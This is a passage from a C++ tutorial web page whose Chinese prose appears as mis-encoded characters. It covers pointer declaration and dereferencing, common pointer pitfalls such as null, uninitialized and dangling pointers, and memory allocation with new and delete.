è¿ç®—ç¬¦è·å–ä¸€ä¸ªå·²å­˜åœ¨å˜é‡çš„åœ°å€æ¥åˆå§‹åŒ–æŒ‡é’ˆã€‚<strong>æŒ‡é’ˆçš„ç±»å‹å¿…é¡»ä¸å˜é‡çš„ç±»å‹åŒ¹é…</strong>ï¼ˆæˆ–èƒ½éšå¼è½¬æ¢ï¼‰ã€‚</li></ol><p><strong>è§£å¼•ç”¨ (<code>*</code> è¿ç®—ç¬¦):</strong></p><p>è§£å¼•ç”¨è¿ç®—ç¬¦ <code>*</code> ç”¨äºè®¿é—®æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜åœ°å€å¤„å­˜å‚¨çš„å€¼ã€‚å½“ <code>*</code> ç”¨äºå·²åˆå§‹åŒ–çš„æœ‰æ•ˆæŒ‡é’ˆå˜é‡å‰æ—¶ï¼Œå®ƒè¡¨ç¤ºâ€œè·å–æŒ‡é’ˆæŒ‡å‘çš„å€¼â€ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> updates = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_updates; <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ int çš„æŒ‡é’ˆï¼Œæœªåˆå§‹åŒ– (å±é™©!)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="literal">nullptr</span>; <span class="comment">// åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ (æ¨è)</span></span><br><span class="line">    <span class="keyword">int</span> * p_zero = <span class="number">0</span>;      <span class="comment">// åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ (æ—§å¼)</span></span><br><span class="line">    <span class="comment">// NULL å®é€šå¸¸åœ¨ &lt;cstddef&gt; æˆ–å…¶ä»– C å¤´æ–‡ä»¶ä¸­å®šä¹‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨åœ°å€åˆå§‹åŒ–</span></span><br><span class="line">    p_updates = &amp;updates; <span class="comment">// å°† updates å˜é‡çš„åœ°å€èµ‹ç»™ p_updates</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®æŒ‡é’ˆä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of updates: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// è¾“å‡º 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of updates: &quot;</span> &lt;&lt; &amp;updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;          <span class="comment">// è¾“å‡º updates çš„å†…å­˜åœ°å€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of p_updates (address): &quot;</span> &lt;&lt; p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºå­˜å‚¨åœ¨ p_updates ä¸­çš„åœ°å€ (åŒä¸Š)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_updates: &quot;</span> &lt;&lt; *p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 6 (updates çš„å€¼)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„å€¼</span></span><br><span class="line">    *p_updates = *p_updates + <span class="number">1</span>; <span class="comment">// å°† p_updates æŒ‡å‘çš„å€¼ (updates) åŠ  1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now updates has value: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡å‘å…¶ä»–ç±»å‹</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> * p_price = &amp;price; <span class="comment">// p_price æŒ‡å‘ price</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_price: &quot;</span> &lt;&lt; *p_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 99.99</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int * p_wrong = &amp;price; // é”™è¯¯! æŒ‡é’ˆç±»å‹ (int*) ä¸å˜é‡ç±»å‹ (double) ä¸åŒ¹é…</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹:</strong></p><ul><li>  <code>int updates;</code>: <code>updates</code> æ˜¯ä¸€ä¸ª <code>int</code> å˜é‡ã€‚</li><li>  <code>int * p_updates;</code>: <code>p_updates</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå®ƒå­˜å‚¨çš„æ˜¯ä¸€ä¸ª <code>int</code> å˜é‡çš„åœ°å€ã€‚</li><li>  <code>p_updates</code>: å­˜å‚¨çš„åœ°å€å€¼ã€‚</li><li>  <code>*p_updates</code>: å­˜å‚¨åœ¨è¯¥åœ°å€å¤„çš„ <code>int</code> å€¼ã€‚</li></ul><h3 id="4-7-2-æŒ‡é’ˆçš„å±é™©"><a href="#4-7-2-æŒ‡é’ˆçš„å±é™©" class="headerlink" title="4.7.2 æŒ‡é’ˆçš„å±é™©"></a>4.7.2 æŒ‡é’ˆçš„å±é™©</h3><p>æŒ‡é’ˆéå¸¸å¼ºå¤§ï¼Œä½†ä¹Ÿå®¹æ˜“å‡ºé”™ï¼Œæ˜¯ C++ ä¸­å¸¸è§çš„ bug æ¥æºã€‚</p><ol><li><strong>è§£å¼•ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ:</strong> å¦‚æœæŒ‡é’ˆæ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå®ƒä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„åœ°å€ï¼ˆåƒåœ¾å€¼ï¼‰ã€‚è§£å¼•ç”¨è¿™ç§æŒ‡é’ˆï¼ˆè¯•å›¾è®¿é—®è¯¥éšæœºåœ°å€å¤„çš„å€¼ï¼‰ä¼šå¯¼è‡´<strong>æœªå®šä¹‰è¡Œä¸º</strong>ï¼Œé€šå¸¸å¯¼è‡´ç¨‹åºå´©æºƒã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_uninitialized;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_uninitialized; // æåº¦å±é™©! ç¨‹åºå¯èƒ½å´©æºƒ</span></span><br><span class="line"><span class="comment">// *p_uninitialized = 100;      // æåº¦å±é™©! å¯èƒ½è¦†ç›–å…³é”®æ•°æ®æˆ–å¯¼è‡´å´©æºƒ</span></span><br></pre></td></tr></table></figure></li><li><strong>è§£å¼•ç”¨ç©ºæŒ‡é’ˆ:</strong> è§£å¼•ç”¨ <code>nullptr</code> (æˆ– <code>0</code>, <code>NULL</code>) åŒæ ·æ˜¯æœªå®šä¹‰è¡Œä¸ºï¼Œé€šå¸¸ä¹Ÿä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚åœ¨ä½¿ç”¨æŒ‡é’ˆå‰ï¼Œæœ€å¥½æ£€æŸ¥å®ƒæ˜¯å¦ä¸ºç©ºã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_null = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_null; // å±é™©! ç¨‹åºå¯èƒ½å´©æºƒ</span></span><br><span class="line"><span class="keyword">if</span> (p_null != <span class="literal">nullptr</span>) &#123; <span class="comment">// æ£€æŸ¥æŒ‡é’ˆæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>æ‚¬æŒ‚æŒ‡é’ˆ (Dangling Pointer):</strong> å½“æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å·²ç»è¢«é‡Šæ”¾æˆ–ä¸å†æœ‰æ•ˆæ—¶ï¼Œè¯¥æŒ‡é’ˆå°±æˆä¸ºæ‚¬æŒ‚æŒ‡é’ˆã€‚è§£å¼•ç”¨æ‚¬æŒ‚æŒ‡é’ˆä¹Ÿæ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ <code>delete</code> ä¹‹åï¼ˆè§ 4.7.5ï¼‰æˆ–æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆåœ¨å…¶ä½œç”¨åŸŸç»“æŸåä»ç„¶å­˜åœ¨æ—¶ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_dangle;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> local_var = <span class="number">10</span>;</span><br><span class="line">    p_dangle = &amp;local_var; <span class="comment">// p_dangle æŒ‡å‘å±€éƒ¨å˜é‡</span></span><br><span class="line">&#125; <span class="comment">// local_var åœ¨è¿™é‡Œè¢«é”€æ¯ï¼Œå†…å­˜å¯èƒ½è¢«å›æ”¶</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_dangle; // å±é™©! p_dangle æ˜¯æ‚¬æŒ‚æŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure></li><li> <strong>å†…å­˜æ³„æ¼ (Memory Leak):</strong> å¦‚æœä½¿ç”¨ <code>new</code> åˆ†é…äº†å†…å­˜ï¼ˆè§ 4.7.4ï¼‰ï¼Œä½†å¿˜è®°ä½¿ç”¨ <code>delete</code> é‡Šæ”¾ï¼Œæˆ–è€…ä¸¢å¤±äº†æŒ‡å‘è¯¥å†…å­˜çš„å”¯ä¸€æŒ‡é’ˆï¼Œè¿™å—å†…å­˜å°±æ— æ³•å†è¢«ç¨‹åºè®¿é—®æˆ–é‡Šæ”¾ï¼Œé€ æˆå†…å­˜æ³„æ¼ã€‚ç¨‹åºè¿è¡Œæ—¶é—´è¶Šé•¿ï¼Œæ³„æ¼çš„å†…å­˜è¶Šå¤šï¼Œæœ€ç»ˆå¯èƒ½è€—å°½ç³»ç»Ÿèµ„æºã€‚</li></ol><p><strong>å®‰å…¨ä½¿ç”¨æŒ‡é’ˆçš„å»ºè®®:</strong></p><ul><li>  <strong>æ€»æ˜¯åˆå§‹åŒ–æŒ‡é’ˆ:</strong> å£°æ˜æŒ‡é’ˆæ—¶ç«‹å³åˆå§‹åŒ–ä¸º <code>nullptr</code> æˆ–ä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€ã€‚</li><li>  <strong>åœ¨ä½¿ç”¨å‰æ£€æŸ¥:</strong> åœ¨è§£å¼•ç”¨æŒ‡é’ˆå‰ï¼Œæ£€æŸ¥å®ƒæ˜¯å¦ä¸º <code>nullptr</code>ã€‚</li><li>  <strong>è°¨æ…å¤„ç†æŒ‡é’ˆç”Ÿå‘½å‘¨æœŸ:</strong> ç¡®ä¿æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨æŒ‡é’ˆä½¿ç”¨æœŸé—´æ˜¯æœ‰æ•ˆçš„ã€‚</li><li>  <strong>é…å¯¹ <code>new</code> å’Œ <code>delete</code>:</strong> åŠ¨æ€åˆ†é…çš„å†…å­˜å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ã€‚</li></ul><h3 id="4-7-3-æŒ‡é’ˆå’Œæ•°å­—"><a href="#4-7-3-æŒ‡é’ˆå’Œæ•°å­—" class="headerlink" title="4.7.3 æŒ‡é’ˆå’Œæ•°å­—"></a>4.7.3 æŒ‡é’ˆå’Œæ•°å­—</h3><p>è™½ç„¶æŒ‡é’ˆå­˜å‚¨çš„æ˜¯å†…å­˜åœ°å€ï¼Œè€Œåœ°å€æœ¬è´¨ä¸Šæ˜¯æ•°å­—ï¼Œä½†<strong>æŒ‡é’ˆç±»å‹å’Œæ•´æ•°ç±»å‹æ˜¯ä¸åŒçš„</strong>ã€‚ä¸èƒ½éšæ„å°†æ•´æ•°èµ‹ç»™æŒ‡é’ˆï¼ˆé™¤äº† <code>0</code>/<code>nullptr</code>ï¼‰ï¼Œä¹Ÿä¸èƒ½ç›´æ¥å°†æŒ‡é’ˆå½“ä½œæ™®é€šæ•´æ•°è¿›è¡Œç®—æœ¯è¿ç®—ï¼ˆæŒ‡é’ˆç®—æœ¯æœ‰ç‰¹æ®Šè§„åˆ™ï¼Œè§ 4.8ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_value = &amp;value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆçš„å€¼æ˜¯åœ°å€ (ä¸€ä¸ªæ•°å­—)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address stored in p_value: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸èƒ½ç›´æ¥å°†ä»»æ„æ•´æ•°èµ‹ç»™æŒ‡é’ˆ</span></span><br><span class="line">    <span class="comment">// p_value = 1000; // é”™è¯¯! ç±»å‹ä¸åŒ¹é… (é™¤éä½¿ç”¨ reinterpret_castï¼Œä½†é€šå¸¸ä¸å®‰å…¨)</span></span><br><span class="line">    </span><br><span class="line">    p_value = <span class="literal">nullptr</span>; <span class="comment">// åˆæ³•ï¼Œèµ‹ç©ºæŒ‡é’ˆ</span></span><br><span class="line">    p_value = <span class="number">0</span>;       <span class="comment">// åˆæ³•ï¼Œèµ‹ç©ºæŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆå¯ä»¥è½¬æ¢ä¸ºæ•´æ•° (é€šå¸¸ä½¿ç”¨ reinterpret_castï¼Œä¸æ¨è)</span></span><br><span class="line">    <span class="comment">// uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); </span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•´æ•°ä¸èƒ½ç›´æ¥è½¬æ¢ä¸ºæŒ‡é’ˆ (é™¤äº† 0)</span></span><br><span class="line">    <span class="keyword">int</span> address_int = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">// int * p_from_int = address_int; // é”™è¯¯!</span></span><br><span class="line">    <span class="comment">// int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // å¯ä»¥ç¼–è¯‘ï¼Œä½†æåº¦å±é™©</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æŒ‡é’ˆè§†ä¸ºåœ°å€ï¼Œè€Œä¸æ˜¯æ™®é€šçš„æ•°å­—ï¼Œæœ‰åŠ©äºé¿å…ç±»å‹é”™è¯¯å’Œä¸å®‰å…¨çš„æ“ä½œã€‚</p><h3 id="4-7-4-ä½¿ç”¨newæ¥åˆ†é…å†…å­˜"><a href="#4-7-4-ä½¿ç”¨newæ¥åˆ†é…å†…å­˜" class="headerlink" title="4.7.4 ä½¿ç”¨newæ¥åˆ†é…å†…å­˜"></a>4.7.4 ä½¿ç”¨newæ¥åˆ†é…å†…å­˜</h3><p><code>new</code> è¿ç®—ç¬¦ç”¨äºåœ¨ç¨‹åºçš„<strong>è‡ªç”±å­˜å‚¨åŒº (Free Store)</strong> æˆ– <strong>å † (Heap)</strong> ä¸ŠåŠ¨æ€åˆ†é…å†…å­˜ã€‚è¿™å…è®¸ä½ åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå˜é‡æˆ–å¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span class="comment">// æˆ–è€…åœ¨å£°æ˜æ—¶åˆ†é…</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥å¸¦åˆå§‹åŒ–å™¨</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName (initializer); <span class="comment">// C++98/03</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName &#123;initializer&#125;; <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: è¿ç®—ç¬¦ã€‚</li><li>  <code>typeName</code>: è¦åˆ†é…å†…å­˜çš„æ•°æ®ç±»å‹ã€‚</li><li>  <code>initializer</code> (å¯é€‰): ç”¨äºåˆå§‹åŒ–æ–°åˆ†é…å†…å­˜çš„å€¼ã€‚</li></ul><p><strong>å·¥ä½œæµç¨‹:</strong></p><ol><li> <code>new</code> åœ¨è‡ªç”±å­˜å‚¨åŒºæ‰¾åˆ°ä¸€å—è¶³å¤Ÿå¤§çš„ã€æœªä½¿ç”¨çš„å†…å­˜å—ï¼Œä»¥å­˜å‚¨ <code>typeName</code> ç±»å‹çš„æ•°æ®ã€‚</li><li> <code>new</code> è¿”å›è¿™å—å†…å­˜çš„<strong>èµ·å§‹åœ°å€</strong>ã€‚</li><li> è¿™ä¸ªåœ°å€è¢«èµ‹ç»™ä¸€ä¸ªç›¸åº”ç±»å‹çš„æŒ‡é’ˆå˜é‡ã€‚</li></ol><p><strong>å¦‚æœ <code>new</code> æ— æ³•åˆ†é…æ‰€éœ€çš„å†…å­˜ï¼ˆä¾‹å¦‚å†…å­˜ä¸è¶³ï¼‰ï¼Œå®ƒä¼šæŠ›å‡ºä¸€ä¸ª <code>std::bad_alloc</code> å¼‚å¸¸</strong>ï¼ˆé™¤éä½¿ç”¨äº† <code>new (std::nothrow)</code> ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬åœ¨å¤±è´¥æ—¶è¿”å› <code>nullptr</code>ï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt; // ä¸ºäº† std::bad_alloc (è™½ç„¶ä¸ä¸€å®šéœ€è¦æ˜¾å¼åŒ…å«) å’Œ std::nothrow</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ†é…ä¸€ä¸ª int çš„å†…å­˜</span></span><br><span class="line">    <span class="keyword">int</span> * p_int = <span class="keyword">new</span> <span class="keyword">int</span>; <span class="comment">// åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…ä¸€ä¸ª int å¤§å°çš„å†…å­˜</span></span><br><span class="line">    <span class="keyword">if</span> (p_int == <span class="literal">nullptr</span>) &#123; <span class="comment">// ç†è®ºæ£€æŸ¥ (å¯¹äºæ™®é€š newï¼Œå¤±è´¥ä¼šæŠ›å¼‚å¸¸)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *p_int = <span class="number">101</span>; <span class="comment">// é€šè¿‡æŒ‡é’ˆè®¿é—®å¹¶èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ†é…ä¸€ä¸ª double å¹¶åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">double</span> * p_double = <span class="keyword">new</span> <span class="keyword">double</span> (<span class="number">99.99</span>); <span class="comment">// åˆ†é…å¹¶åˆå§‹åŒ–ä¸º 99.99</span></span><br><span class="line">    <span class="comment">// æˆ–è€… C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">// double * p_double = new double &#123;99.99&#125;; </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated int: &quot;</span> &lt;&lt; *p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated double: &quot;</span> &lt;&lt; *p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of int: &quot;</span> &lt;&lt; p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of double: &quot;</span> &lt;&lt; p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- å†…å­˜é‡Šæ”¾å°†åœ¨ä¸‹ä¸€èŠ‚è®²è§£ ---</span></span><br><span class="line">    <span class="comment">// delete p_int; </span></span><br><span class="line">    <span class="comment">// delete p_double;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ nothrow ç‰ˆæœ¬ (å¤±è´¥æ—¶è¿”å› nullptr)</span></span><br><span class="line">    <span class="keyword">int</span> * p_lots_of_ints = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow) <span class="keyword">int</span>[<span class="number">1000000000</span>]; <span class="comment">// å°è¯•åˆ†é…å·¨å¤§æ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (p_lots_of_ints == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation failed, but program continues.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation succeeded (unlikely).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// delete[] p_lots_of_ints; // å¦‚æœæˆåŠŸï¼Œéœ€è¦é‡Šæ”¾</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€åˆ†é…çš„å†…å­˜<strong>ä¸ä¼š</strong>åƒè‡ªåŠ¨å˜é‡é‚£æ ·åœ¨ä½œç”¨åŸŸç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ã€‚ç¨‹åºå‘˜å¿…é¡»è´Ÿè´£åœ¨ä¸å†éœ€è¦æ—¶æ‰‹åŠ¨é‡Šæ”¾å®ƒã€‚</p><h3 id="4-7-5-ä½¿ç”¨deleteé‡Šæ”¾å†…å­˜"><a href="#4-7-5-ä½¿ç”¨deleteé‡Šæ”¾å†…å­˜" class="headerlink" title="4.7.5 ä½¿ç”¨deleteé‡Šæ”¾å†…å­˜"></a>4.7.5 ä½¿ç”¨deleteé‡Šæ”¾å†…å­˜</h3><p><code>delete</code> è¿ç®—ç¬¦ç”¨äºé‡Šæ”¾ç”± <code>new</code> åˆ†é…çš„å†…å­˜ï¼Œå°†å…¶å½’è¿˜ç»™è‡ªç”±å­˜å‚¨åŒºï¼Œä»¥ä¾¿åç»­å¯ä»¥é‡æ–°åˆ†é…ä½¿ç”¨ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable; </span><br></pre></td></tr></table></figure><ul><li>  <code>delete</code>: è¿ç®—ç¬¦ã€‚</li><li>  <code>pointerVariable</code>: æŒ‡å‘ç”± <code>new</code>ï¼ˆ**ä¸æ˜¯ <code>new[]</code>**ï¼‰åˆ†é…çš„å†…å­˜çš„æŒ‡é’ˆã€‚</li></ul><p><strong>å·¥ä½œæµç¨‹:</strong></p><ol><li> <code>delete</code> æ¥æ”¶ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆå¿…é¡»æŒ‡å‘ç”± <code>new</code> åˆ†é…çš„å†…å­˜å—çš„èµ·å§‹åœ°å€ã€‚</li><li> <code>delete</code> é‡Šæ”¾è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å—ã€‚</li><li> 